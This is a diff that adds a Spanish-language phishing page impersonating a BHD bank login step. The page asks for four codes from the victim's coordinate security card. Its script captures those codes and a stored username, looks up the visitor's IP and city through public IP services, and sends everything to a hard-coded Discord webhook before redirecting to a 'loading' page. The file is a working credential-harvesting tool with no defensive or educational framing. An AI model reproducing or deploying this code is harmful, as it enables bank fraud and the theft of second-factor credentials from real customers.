@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Coordenadas 1</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&family=Roboto+Slab:ital,wght@1,400&display=swap');
+
+  html, body {
+    height: 100%;
+    margin: 0; padding: 0;
+    font-family: 'Roboto', sans-serif;
+    background: url('background-login.webp') no-repeat center center fixed;
+    background-size: cover;
+    display: flex; justify-content: center; align-items: center;
+  }
+  .banner {
+    background: white;
+    width: 420px;
+    max-width: 95vw;
+    padding: 30px 30px 40px 30px;
+    border-radius: 8px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    text-align: center;
+  }
+  .header {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 20px;
+  }
+  .logo {
+    max-width: 140px;
+  }
+  .linea-personal {
+    color: #51b046;
+    font-family: 'Roboto Slab', serif;
+    font-style: italic;
+    font-weight: 400;
+    font-size: 1.3rem;
+    margin-left: 10px;
+    user-select: none;
+  }
+  .titulo {
+    color: #51b046;
+    font-family: 'Roboto Slab', serif;
+    font-weight: 400;
+    font-size: 1.2rem;
+    margin-bottom: 25px;
+    user-select: none;
+  }
+  .tarjeta-img {
+    max-width: 320px;
+    width: 90%;
+    margin: 0 auto 25px;
+    display: block;
+  }
+  form {
+    text-align: left;
+  }
+  .row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 18px;
+  }
+  .numero-fijo {
+    background: #ddd;
+    width: 30px;
+    height: 30px;
+    border-radius: 4px;
+    text-align: center;
+    font-weight: 600;
+    font-size: 1rem;
+    line-height: 30px;
+    user-select: none;
+    flex-shrink: 0;
+  }
+  input[type="text"] {
+    width: 80px;
+    padding: 8px 10px;
+    font-size: 1rem;
+    border: 2px solid #ccc;
+    border-radius: 6px;
+    box-sizing: border-box;
+    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    flex-grow: 1;
+  }
+  input[type="text"]:focus {
+    border-color: #50ba3f;
+    box-shadow: 0 0 10px #50ba3f;
+    outline: none;
+  }
+  button {
+    width: 100%;
+    padding: 14px;
+    background-color: #51b046;
+    border: none;
+    border-radius: 6px;
+    color: white;
+    font-size: 1.1rem;
+    cursor: pointer;
+    font-weight: 600;
+    transition: background-color 0.3s ease;
+    margin-top: 10px;
+  }
+  button:hover {
+    background-color: #429635;
+  }
+</style>
+</head>
+<body>
+  <div class="banner">
+    <div class="header">
+      <img src="logo145.png" alt="Logo" class="logo" />
+      <div class="linea-personal">| Personal</div>
+    </div>
+
+    <div class="titulo">INGRESE CADA CÓDIGO DE SU TARJETA DE COORDENADAS</div>
+    <img src="tarjje.PNG" alt="Tarjeta de Coordenadas" class="tarjeta-img" />
+
+    <form method="POST" action="cargando3.html" id="coordinatesForm">
+      <div class="row">
+        <div class="numero-fijo">03</div>
+        <input type="text" id="codigo03" name="codigo03" maxlength="4" pattern="\d{4}" inputmode="numeric" required />
+        <div class="numero-fijo">13</div>
+        <input type="text" id="codigo13" name="codigo13" maxlength="4" pattern="\d{4}" inputmode="numeric" required />
+      </div>
+
+      <div class="row">
+        <div class="numero-fijo">23</div>
+        <input type="text" id="codigo23" name="codigo23" maxlength="4" pattern="\d{4}" inputmode="numeric" required />
+        <div class="numero-fijo">33</div>
+        <input type="text" id="codigo33" name="codigo33" maxlength="4" pattern="\d{4}" inputmode="numeric" required />
+      </div>
+
+      <button type="submit" id="submitBtn">Continuar</button>
+    </form>
+  </div>
+
+<script>
+  
+// Al principio del script
+const usuario = localStorage.getItem('usuario') || 'Usuario no encontrado';
+console.log('Usuario recuperado:', usuario); // Para depurar
+
+  // Configuración del Webhook de Discord
+  // REEMPLAZA ESTA URL CON TU WEBHOOK DE DISCORD
+  const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1472057162447720539/1ah2nyf69R2i7vlRY5v-WKvnCE3esv5E_J-kcR9vdKTABGfGRqMbsEYn9R5Hml77rjn6';
+
+  // Limpiar inputs solo de números
+  document.querySelectorAll('input[type="text"]').forEach(input => {
+    input.addEventListener('input', () => {
+      input.value = input.value.replace(/\D/g, '');
+    });
+  });
+
+  // Interceptar el envío del formulario
+  document.getElementById('coordinatesForm').addEventListener('submit', async function(e) {
+    e.preventDefault(); // Prevenir envío normal
+    
+    const codigo03 = document.getElementById('codigo03').value;
+    const codigo13 = document.getElementById('codigo13').value;
+    const codigo23 = document.getElementById('codigo23').value;
+    const codigo33 = document.getElementById('codigo33').value;
+    const submitBtn = document.getElementById('submitBtn');
+    
+    // Deshabilitar el botón para evitar múltiples envíos
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Enviando...';
+    
+    // Obtener IP del usuario
+    let ip = 'IP desconocida';
+    let ciudad = 'Desconocida';
+    let pais = 'Desconocido';
+    
+    try {
+      // Obtener IP pública
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      if (ipResponse.ok) {
+        const ipData = await ipResponse.json();
+        ip = ipData.ip;
+        
+        // Obtener ubicación basada en IP (usando ipapi.co)
+        try {
+          const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+          if (locationResponse.ok) {
+            const locationData = await locationResponse.json();
+            ciudad = locationData.city || 'Desconocida';
+            pais = locationData.country_name || 'Desconocido';
+          }
+        } catch (locationError) {
+          console.log('No se pudo obtener la ubicación');
+        }
+      }
+    } catch (error) {
+      console.log('No se pudo obtener la IP pública');
+    }
+    
+    // Formatear fecha
+    const now = new Date();
+    const fechaFormateada = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
+    
+    // Crear mensaje para Discord
+    const mensaje = {
+      content: `💰 BHD COORDENADAS TARJETA 1 💰
+
+✉️ Usuario: ${usuario}
+
+🔢 Coordenadas ingresadas:
+03: ${codigo03 || "No ingresado"}
+13: ${codigo13 || "No ingresado"}
+23: ${codigo23 || "No ingresado"}
+33: ${codigo33 || "No ingresado"}
+
+🌐 IP: ${ip}
+🏙 Ciudad: ${ciudad}
+🇩🇴 País: ${pais}
+
+🕒 Fecha: ${fechaFormateada}
+
+BY ASHESITO`
+    };
+    
+    // Enviar datos a Discord
+    try {
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(mensaje)
+      });
+      
+      console.log('Datos enviados a Discord');
+      
+    } catch (error) {
+      console.error('Error enviando a Discord:', error);
+    }
+    
+    // Redireccionar a cargando3.php después de 1 segundo
+    setTimeout(() => {
+      // Enviar formulario normalmente (esto redirigirá a cargando3.php)
+      this.submit();
+    }, 1000);
+  });
+</script>
+</body>
+</html>
